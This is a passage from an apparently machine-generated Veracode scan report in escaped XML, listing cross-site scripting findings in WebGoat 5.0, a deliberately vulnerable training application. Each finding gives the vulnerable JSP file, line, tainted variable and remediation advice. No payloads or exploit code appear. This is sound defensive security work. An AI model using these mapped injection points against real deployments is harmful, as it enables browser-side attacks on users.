        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lesson_solutions/UncheckedEmail_files/image001.png\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"285\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lessons/General/redirect.jsp\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"286\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lessons/RoleBasedAccessControl/images/orgChart.jpg\"/>\n</dynamicflaws>\n</cwe>\n<cwe
        cweid=\"80\" cwename=\"Improper Neutralization of Script-Related HTML Tags
        in a Web Page (Basic XSS)\" pcirelated=\"true\">\n<description>\n<text text=\"This
        call contains a cross-site scripting (XSS) flaw.  The application populates
        the HTTP response with user-supplied input, allowing an attacker to embed
        malicious content, such as Javascript code, which will be executed in the
        context of the victim's browser.  XSS vulnerabilities are commonly exploited
        to steal or manipulate cookies, modify presentation of content, and compromise
        confidential information, with new attack vectors being discovered on a regular
        basis.\"/>\n</description>\n<staticflaws>\n<flaw severity=\"3\" categoryname=\"Improper
        Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\" count=\"1\"
        issueid=\"184\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.jsp.JspWriter.print\"
        description=\"This call to javax.servlet.jsp.JspWriter.print() contains a
        cross-site scripting (XSS) flaw. The application populates the HTTP response
        with user-supplied input, allowing an attacker to embed malicious content,
        such as Javascript code, which will be executed in the context of the victim's
        browser. XSS vulnerabilities are commonly exploited to steal or manipulate
        cookies, modify presentation of content, and compromise confidential information,
        with new attack vectors being discovered on a regular basis. The first argument
        to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile.jsp\" line=\"89\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"56\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"240\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile.jsp\" line=\"94\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"60\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"177\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"15\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"63\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"15\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"84\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"15\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"62\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"58\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"77\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"58\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"161\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"58\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"128\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"62\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"24\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"268\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"62\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"24\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"123\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
